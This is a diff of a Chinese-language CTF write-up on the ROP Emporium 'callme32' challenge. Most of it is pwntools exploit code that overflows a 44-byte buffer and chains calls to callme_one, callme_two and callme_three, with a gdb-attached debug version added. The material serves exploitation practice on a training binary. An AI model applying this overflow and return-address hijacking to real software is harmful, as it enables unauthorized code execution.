@@ -195,7 +195,6 @@ callme_one_plt = callme32.plt["callme_one"]
 callme_two_plt = callme32.plt["callme_two"]
 callme_three_plt = callme32.plt["callme_three"]
 pwnme = callme32.symbols["pwnme"]
-# padding = cyclic(100)
 
 exp = "A" * (0x28 + 0x4)
 exp += p32(callme_one_plt)
@@ -203,9 +202,8 @@ exp += p32(pwnme)
 exp += p32(1)
 exp += p32(2)
 exp += p32(3)
-
 callme32_process.sendline(exp)
-# callme32_process.sendline(padding)
+
 
 exp0 = "A" * 44
 exp0 += p32(callme_two_plt)
@@ -213,7 +211,6 @@ exp0 += p32(pwnme)
 exp0 += p32(1)
 exp0 += p32(2)
 exp0 += p32(3)
-
 callme32_process.sendline(exp0)
 
 exp1 = "A" * 44
@@ -222,8 +219,8 @@ exp1 += p32(0xdead)
 exp1 += p32(1)
 exp1 += p32(2)
 exp1 += p32(3)
-
 callme32_process.sendline(exp1)
+
 print(callme32_process.recvall())
 callme32_process.interactive()
 ```
@@ -236,7 +233,54 @@ pwnme(overflow) -> callme_one -> pwnme(overflow) -> callme_two -> pwnme(overflow
 
 我是使用了多次调用 `pwnme` ，每次调用都溢出那个 `buffer` 然后把返回地址覆盖成我想要调用的函数
 
-可以看到（看  DISASM 窗口）：
+这是我用来完成下面步骤的 debug 版的 exp，其实就是用了 gdb attach 上去（`gdb.attach(callme32_pid)`），我用的是 docker 没有图形，我只能用 tmux 分屏（`context.terminal = ["tmux", "split-window", "-h"]`）
+
+```python
+from pwn import *
+
+context.terminal = ["tmux", "split-window", "-h"]
+callme32_process = process("callme32")
+callme32_pid = pidof(callme32_process)[0]
+callme32 = ELF("callme32")
+callme_one_plt = callme32.plt["callme_one"]
+callme_two_plt = callme32.plt["callme_two"]
+callme_three_plt = callme32.plt["callme_three"]
+pwnme = callme32.symbols["pwnme"]
+
+gdb.attach(callme32_pid)
+exp = "A" * (0x28 + 0x4)
+exp += p32(callme_one_plt)
+exp += p32(pwnme)
+exp += p32(1)
+exp += p32(2)
+exp += p32(3)
+
+callme32_process.sendline(exp)
+
+exp0 = "A" * 44
+exp0 += p32(callme_two_plt)
+exp0 += p32(pwnme)
+exp0 += p32(1)
+exp0 += p32(2)
+exp0 += p32(3)
+
+callme32_process.sendline(exp0)
+
+exp1 = "A" * 44
+exp1 += p32(callme_three_plt)
+exp1 += p32(0x41414141)
+exp1 += p32(1)
+exp1 += p32(2)
+exp1 += p32(3)
+
+callme32_process.sendline(exp1)
+print(callme32_process.recvall())
+callme32_process.interactive()
+```
+
+
+
+可以看到（全程请看  DISASM 窗口）：
 
 ```python
 # 第一次溢出
@@ -297,3 +341,4 @@ pwn！
 这是x86_64 的栈对齐：https://www.cnblogs.com/tcctw/p/11333743.html
 
 照猫画虎吧，懒得找 x86 的，或者自己搜
+
